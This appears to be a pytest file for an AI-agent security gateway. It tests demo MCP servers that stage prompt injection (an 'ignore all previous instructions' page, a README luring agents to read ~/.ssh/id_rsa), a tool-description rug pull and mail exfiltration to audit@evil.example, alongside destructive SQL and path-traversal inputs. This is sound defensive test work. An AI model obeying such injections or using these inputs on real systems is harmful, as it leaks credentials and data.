"""Phase 2A: the demo MCP servers (mcp-servers/) on their own and behind the gateway.

The real servers (MCP Python SDK) run in-process as ASGI apps behind the proxy, so these tests also prove that
the gateway speaks to genuine SDK servers (session ids, SSE answers, structured output).
"""

from __future__ import annotations

import importlib.util
import json
import sys
from collections.abc import Iterator
from pathlib import Path
from types import ModuleType
from typing import Any

import httpx
import pytest
from fastapi.testclient import TestClient

from acl.controls.mcp.scan import scan_tool
from acl.controls.pii.validators import valid_iban, valid_pesel
from acl.main import create_app
from acl.mcp_proxy.testing import HostRouter
from acl.policy.loader import load_policy_dir
from acl.settings import Settings

REPO = Path(__file__).resolve().parents[2]
SERVERS = REPO / "mcp-servers"
POLICY_DIR = REPO / "policy"
sys.path.insert(0, str(SERVERS))
sys.path.insert(0, str(REPO / "tests"))
from oracle.leak import LeakOracle  # noqa: E402

HOSTS = {
    "governed-tools": "mcp-governed",
    "files": "mcp-files",
    "mail": "mcp-mail",
    "web": "mcp-web",
    "core-banking": "mcp-core-banking",
    "rugpull-demo": "mcp-rugpull",
}
DEV = {"X-ACL-Dev-User": "anna", "X-ACL-Dev-Groups": "developers"}
ANALYST = {"X-ACL-Dev-User": "jan", "X-ACL-Dev-Groups": "credit-analysts"}
ADMIN = {"X-ACL-Dev-User": "adam", "X-ACL-Dev-Groups": "admins", "X-ACL-Dev-Roles": "acl-admin"}


def load_server(name: str) -> ModuleType:
    key = f"demo_server_{name.replace('-', '_')}"
    if key in sys.modules:
        return sys.modules[key]
    sys.path.insert(0, str(SERVERS / name))  # `import data` inside core-banking
    spec = importlib.util.spec_from_file_location(key, SERVERS / name / "server.py")
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    sys.modules[key] = module
    spec.loader.exec_module(module)
    return module


def bank_data() -> ModuleType:
    spec = importlib.util.spec_from_file_location("bank_data_mod", SERVERS / "core-banking" / "data.py")
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


# ============================================================ data & servers alone


def test_core_banking_data_is_synthetic_but_checksum_valid() -> None:
    data = bank_data()
    con = data.build_db()
    pesels = [r[0] for r in con.execute("SELECT pesel FROM clients")]
    ibans = [r[0] for r in con.execute("SELECT iban FROM accounts")]
    assert len(pesels) >= 30 and all(valid_pesel(p) for p in pesels)
    assert all(valid_iban(i) for i in ibans)
    assert valid_pesel(data.CANARY_PESEL) and valid_iban(data.CANARY_IBAN)
    # canary rows exist in every table
    assert con.execute("SELECT COUNT(*) FROM clients WHERE id = ?", (data.CANARY_CLIENT_ID,)).fetchone()[0] == 1
    assert con.execute("SELECT COUNT(*) FROM accounts WHERE client_id = ?", (data.CANARY_CLIENT_ID,)).fetchone()[0] == 1
    assert con.execute("SELECT COUNT(*) FROM loans WHERE client_id = ?", (data.CANARY_CLIENT_ID,)).fetchone()[0] == 1


def test_policy_canaries_cover_the_data_canaries() -> None:
    data = bank_data()
    policy = load_policy_dir(POLICY_DIR).policy
    (cfg,) = [c for c in policy.controls if c.type == "mcp_protocol"]
    assert set(data.CANARIES) <= set(cfg.params["canaries"])


def test_core_banking_engine_is_read_only() -> None:
    from mcp.server.mcpserver.exceptions import ToolError

    server = load_server("core-banking")
    out = json.loads(server.query("SELECT name, city FROM clients WHERE id = 1"))
    assert out["columns"] == ["name", "city"] and len(out["rows"]) == 1
    for bad in (
        "DROP TABLE clients",
        "DELETE FROM clients",
        "UPDATE clients SET name = 'x'",
        "SELECT 1; DROP TABLE clients",
        "ATTACH DATABASE 'x.db' AS x",
        "PRAGMA writable_schema = ON",
    ):
        with pytest.raises(ToolError):
            server.query(bad)
    assert json.loads(server.query("SELECT COUNT(*) FROM clients"))["rows"][0][0] >= 30


def test_rugpull_server_flips_after_n_calls_and_on_trigger() -> None:
    server = load_server("rugpull-demo")
    tool = server.server._tool_manager.get_tool("get_weather")
    state = server.state
    state.update(calls=0, rugged=False)
    tool.description = server.BENIGN
    assert not scan_tool("get_weather", tool.description, {})
    for _ in range(server.AFTER_CALLS):
        server.get_weather("Kraków")
    assert tool.description == server.MALICIOUS and scan_tool("get_weather", tool.description, {})
    state.update(calls=0, rugged=False)
    tool.description = server.BENIGN
    state["rugged"] = True
    tool.description = server.MALICIOUS
    assert state["rugged"]


def test_mail_server_delivers_attacker_mail_to_the_sink(monkeypatch: pytest.MonkeyPatch) -> None:
    server = load_server("mail")
    posted: list[Any] = []

    class Resp:
        def read(self) -> bytes:
            return b"{}"

    monkeypatch.setattr(server.urllib.request, "urlopen", lambda req, timeout=0: posted.append(req) or Resp())
    server.send_email("colleague@corp.example", "hi", "lunch?")
    assert posted == []
    server.send_email("audit@evil.example", "inbox", "everything")
    assert len(posted) == 1 and b"everything" in posted[0].data
    inbox = json.loads(server.read_inbox())
    assert any("forward everything" in m["body"] and "audit@evil.example" in m["body"] for m in inbox)


def test_files_server_is_workspace_scoped_and_ships_a_poisoned_readme(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    from mcp.server.mcpserver.exceptions import ToolError

    server = load_server("files")
    assert "~/.ssh/id_rsa" in server.read_file("README.md")
    assert "src/" in server.list_files(".")
    for outside in ("../../../etc/passwd", "~/.ssh/id_rsa", "/etc/passwd"):
        with pytest.raises(ToolError):
            server.read_file(outside)
    monkeypatch.setattr(server, "ALLOW_OUTSIDE", True)  # the "vulnerable server" demo switch
    secret = tmp_path / "outside.txt"
    secret.write_text("outside")
    assert server.read_file(str(secret)) == "outside"


def test_web_server_serves_planted_injections_offline() -> None:
    server = load_server("web")
    assert "ignore all previous instructions" in server.fetch("https://evil.example.net/blog/ten-tips")
    assert server.fetch("https://unknown.example/x") == "404 Not Found"


def test_every_demo_tool_description_passes_the_poisoning_scan_when_benign() -> None:
    import asyncio

    for name in ("governed-tools", "files", "mail", "web", "core-banking"):
        module = load_server(name)
        for t in asyncio.run(module.server.list_tools()):
            hits = scan_tool(t.name, t.description, t.input_schema if hasattr(t, "input_schema") else t.inputSchema)
            assert not hits, (name, t.name, hits)


# ============================================================ behind the gateway


class RealEnv:
    def __init__(self, app: Any, client: TestClient) -> None:
        self.app, self.client, self.n = app, client, 0

    def rpc(
        self,
        server: str,
        method: str,
        params: dict[str, Any] | None = None,
        *,
        headers: dict[str, str] | None = None,
        session: str | None = None,
    ) -> dict[str, Any]:
        self.n += 1
        h = dict(headers or DEV)
        if session:
            h["Mcp-Session-Id"] = session
        body: dict[str, Any] = {"jsonrpc": "2.0", "id": self.n, "method": method}
        if params is not None:
            body["params"] = params
        r = self.client.post(f"/mcp/{server}", json=body, headers=h)
        out = r.json()
        out["_sid"] = r.headers.get("mcp-session-id")
        return out

    def open(self, server: str, headers: dict[str, str] | None = None) -> str:
        out = self.rpc(server, "initialize", {"protocolVersion": "2025-11-25", "capabilities": {}}, headers=headers)
        assert "result" in out, out
        return out["_sid"]

    def call(
        self, server: str, sid: str, name: str, args: dict[str, Any], headers: dict[str, str] | None = None
    ) -> dict[str, Any]:
        return self.rpc(server, "tools/call", {"name": name, "arguments": args}, session=sid, headers=headers)

    def audit_text(self) -> str:
        return self.app.state.settings.audit_path.read_text(encoding="utf-8")


@pytest.fixture
def real(tmp_path: Path) -> Iterator[RealEnv]:
    modules = {HOSTS[n]: load_server(n) for n in HOSTS}
    # reset the stateful demo servers
    modules["mcp-rugpull"].state.update(calls=0, rugged=False)
    modules["mcp-rugpull"].server._tool_manager.get_tool("get_weather").description = modules["mcp-rugpull"].BENIGN
    import common

    apps = {host: common.make_app(m.server) for host, m in modules.items()}
    settings = Settings(
        policy_dir=POLICY_DIR,
        database_url=f"sqlite+aiosqlite:///{tmp_path / 'acl.db'}",
        audit_path=tmp_path / "audit.jsonl",
        deterministic=True,
        value_hash_salt="test-salt",  # type: ignore[arg-type]
    )
    app = create_app(settings, allow_anonymous_dev=True)
    contexts: list[Any] = []

    async def start(application: Any) -> None:  # SDK servers need their ASGI lifespan (session manager task group)
        for a in apps.values():
            ctx = a.router.lifespan_context(a)
            await ctx.__aenter__()
            contexts.append(ctx)

    async def stop(application: Any) -> None:
        for ctx in reversed(contexts):
            await ctx.__aexit__(None, None, None)

    app.state.on_startup.append(start)
    app.state.on_shutdown.append(stop)
    with TestClient(app) as client:
        app.state.mcp_proxy.factory.client = httpx.AsyncClient(transport=HostRouter(apps), follow_redirects=False)
        yield RealEnv(app, client)


def test_gateway_speaks_to_genuine_sdk_servers(real: RealEnv) -> None:
    expected = {
        "governed-tools": {"search_docs", "list_dir", "read_text", "shell_echo", "http_get"},
        "files": {"read_file", "list_files"},
        "mail": {"read_inbox", "send_email"},
        "web": {"fetch"},
        "rugpull-demo": {"get_weather"},
    }
    for server, names in expected.items():
        sid = real.open(server)
        listed = real.rpc(server, "tools/list", session=sid)["result"]["tools"]
        assert {t["name"] for t in listed} == names, server
        assert all(t["inputSchema"].get("type") == "object" for t in listed)
    out = real.call("files", real.open("files"), "read_file", {"path": "README.md"})
    assert "result" in out and "Invoice Tools" in out["result"]["content"][0]["text"]
    gov = real.call("governed-tools", real.open("governed-tools"), "shell_echo", {"text": "hello"})
    assert gov["result"]["content"][0]["text"] == "hello"


def test_scenario_6_rug_pull_with_the_real_demo_server(real: RealEnv) -> None:
    server = "rugpull-demo"
    sid = real.open(server)
    assert [t["name"] for t in real.rpc(server, "tools/list", session=sid)["result"]["tools"]] == ["get_weather"]
    for city in ("Kraków", "Wrocław", "Poznań"):  # the server rugs itself after three calls (distinct args:
        # identical repeated calls would trip SEC-LOOP-01's repeat-call detector, which is correct behaviour)
        real.app.state.mcp_proxy._last_refresh.clear()
        out = real.call(server, sid, "get_weather", {"city": city})
        assert "result" in out or out["error"]["data"]["rule_ids"] == ["SEC-MCP-01"], out
    tools = real.rpc(server, "tools/list", session=sid)["result"]["tools"]
    assert tools == []
    row = next(t for t in real.client.get("/admin/v1/mcp/tools", headers=ADMIN).json() if t["server"] == server)
    assert row["status"] == "quarantined" and "IMPORTANT" in row["description_diff"]
    assert any(i["category"] == "mcp_rug_pull" for i in real.client.get("/admin/v1/incidents", headers=ADMIN).json())
    real.app.state.mcp_proxy._last_refresh.clear()
    assert real.call(server, sid, "get_weather", {"city": "Gdańsk"})["error"]["data"]["rule_ids"][0] == "SEC-MCP-01"


def test_scenario_13_core_banking_through_the_gateway(real: RealEnv) -> None:
    data = bank_data()
    oracle = LeakOracle(
        {
            "canary_name": data.CANARY_NAME,
            "canary_pesel": data.CANARY_PESEL,
            "canary_iban": data.CANARY_IBAN,
            "canary_note": data.CANARY_NOTE,
        }
    )
    sid = real.open("core-banking", ANALYST)
    tools = real.rpc("core-banking", "tools/list", session=sid, headers=ANALYST)["result"]["tools"]
    assert [t["name"] for t in tools] == ["query"]
    # permitted columns: PESELs are pseudonymised on the way out
    ok = real.call(
        "core-banking", sid, "query", {"sql": "SELECT name, pesel FROM clients WHERE id <= 3"}, headers=ANALYST
    )
    text = ok["result"]["content"][0]["text"]
    assert "<PESEL_1>" in text
    assert not any(valid_pesel(tok) for tok in text.replace('"', " ").replace(",", " ").split())
    # a scan of the whole table returns the canary row: its values are redacted, never delivered
    scan = real.call(
        "core-banking", sid, "query", {"sql": "SELECT id, name, pesel, city FROM clients"}, headers=ANALYST
    )
    oracle.assert_clean(scan, channel="mcp_result", what="the full-table result")
    notes = real.call(
        "core-banking", sid, "query", {"sql": "SELECT name, internal_risk_notes FROM clients"}, headers=ANALYST
    )
    oracle.assert_clean(notes, channel="mcp_result", what="the risk-notes result")
    oracle.assert_clean(real.audit_text(), channel="audit_log", what="the audit log")
    assert any(
        i["category"] == "canary_triggered" for i in real.client.get("/admin/v1/incidents", headers=ADMIN).json()
    )
    # another group has no access to this server at all
    denied = real.rpc("core-banking", "initialize", {"protocolVersion": "2025-11-25"}, headers=DEV)
    assert denied["error"]["data"]["rule_ids"] == ["SEC-MCP-02"]


def test_poisoned_readme_reaches_the_client_only_through_inspection_and_the_key_read_is_blocked(real: RealEnv) -> None:
    sid = real.open("files")
    real.rpc("files", "tools/list", session=sid)
    readme = real.call("files", sid, "read_file", {"path": "README.md"})
    assert "result" in readme  # reading the README is allowed; the signature feed catches the follow-up read
    key = real.call("files", sid, "read_file", {"path": "~/.ssh/id_rsa"})
    assert key["error"]["code"] == -32001 and "SIG-PATH-SSH-KEYS-01" in key["error"]["data"]["rule_ids"]
    assert "ACL-DEMO-SSH-CANARY" not in json.dumps(key)
